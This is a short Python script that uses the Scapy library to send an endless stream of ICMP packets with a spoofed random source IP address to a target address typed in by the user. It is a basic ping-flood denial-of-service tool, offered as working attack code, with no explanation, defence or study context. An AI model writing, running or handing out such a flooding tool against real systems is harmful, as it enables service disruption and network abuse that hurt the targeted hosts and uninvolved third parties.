from scapy.all import*

targetIP = input(">>>Target IP Address: ")
sourceIP = RandIP()

while True:
    try:
        print(sourceIP," ===> ",targetIP)
        pkt = IP(dst=targetIP, src=sourceIP)/ICMP()
        send(pkt)

    except KeyboardInterrupt:
      exit("\n>>>Program exited!")